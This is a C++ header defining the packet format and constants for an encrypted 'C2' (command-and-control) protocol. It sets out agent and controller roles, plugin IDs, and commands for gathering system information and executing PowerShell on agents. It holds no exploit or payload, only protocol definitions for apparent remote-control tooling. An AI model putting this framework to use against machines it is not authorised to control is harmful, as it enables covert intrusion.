// protocol.h — C2 协议规范 v1 的 C++ 端实现（docs/protocol.md）
// 20 字节固定头编解码 + 常量定义。加密见 crypto.h（BCrypt AES-GCM/HKDF）。
#pragma once

#include <cstdint>
#include <cstddef>
#include <string>

namespace c2
{

    // ---- 协议常量 ----
    constexpr uint16_t kMagic = 0x5A5A;
    constexpr uint8_t kVersion = 1;
    constexpr size_t kHeaderSize = 20;
    constexpr uint32_t kMaxPayload = 16 * 1024 * 1024; // 16 MiB

    constexpr uint8_t kFlagEncrypted = 0x01;
    constexpr uint8_t kFlagCompress = 0x02; // 预留

    // 插件 ID
    constexpr uint8_t kPluginCore = 0x00;
    constexpr uint8_t kPluginRemote = 0x01;
    constexpr uint8_t kPluginFile = 0x02;
    constexpr uint8_t kPluginSys = 0x03;
    constexpr uint8_t kPluginCtl = 0xFF;

    // 连接角色
    constexpr uint8_t kRoleAgent = 0;
    constexpr uint8_t kRoleControl = 1;

    // 核心指令码
    constexpr uint16_t kCmdHello = 0x0101;
    constexpr uint16_t kCmdHelloAck = 0x0102;
    constexpr uint16_t kCmdHeartbeat = 0x0103;
    constexpr uint16_t kCmdResult = 0x0104;
    constexpr uint16_t kCmdEvent = 0x0105;
    constexpr uint16_t kCmdBye = 0x0106;
    constexpr uint16_t kCtlList = 0x4001;
    constexpr uint16_t kCtlKillSession = 0x4002;
    constexpr uint16_t kCtlGetSession = 0x4003;

    // 业务指令码（系统段 0x3xxx，plugin=kPluginSys）
    constexpr uint16_t kCmdSysInfo = 0x3001; // 收集系统信息
    constexpr uint16_t kCmdExecPs = 0x3008;  // 执行 PowerShell 命令

    // 状态码
    constexpr uint8_t kStatusOK = 0;
    constexpr uint8_t kStatusUnknownCmd = 1;
    constexpr uint8_t kStatusBadParam = 2;
    constexpr uint8_t kStatusNoPermission = 3;
    constexpr uint8_t kStatusNotFound = 4;
    constexpr uint8_t kStatusTimeout = 5;
    constexpr uint8_t kStatusNoSession = 6;
    constexpr uint8_t kStatusPluginErrBase = 0x80;

    // 密钥长度
    constexpr size_t kPskLen = 32;
    constexpr size_t kSessionKeyLen = 32;
    constexpr size_t kNonceLen = 12;       // AES-GCM 每包 nonce
    constexpr size_t kClientNonceLen = 16; // 握手客户端随机数
    constexpr size_t kServerNonceLen = 16; // 握手服务端随机数
    constexpr size_t kAgentIdLen = 16;

    // 握手版本协商（协议版本 1 << 16 | 兼容版本 1）
    constexpr uint32_t kHelloVersion = (1u << 16) | 1u;

    // ---- 20 字节固定头（little-endian）----
    struct Header
    {
        uint16_t magic = kMagic;
        uint8_t version = kVersion;
        uint8_t flags = 0;
        uint32_t seq = 0;
        uint32_t timestamp = 0;
        uint16_t cmd = 0;
        uint8_t plugin = 0;
        uint8_t status = 0;
        uint32_t payload_len = 0;
    };

    // 编码为 20 字节（magic/version 强制写入）；解码校验 magic/version/payload_len。
    void encode_header(const Header &h, uint8_t out[20]);
    bool decode_header(const uint8_t in[20], Header &h, std::string &err);

} // namespace c2
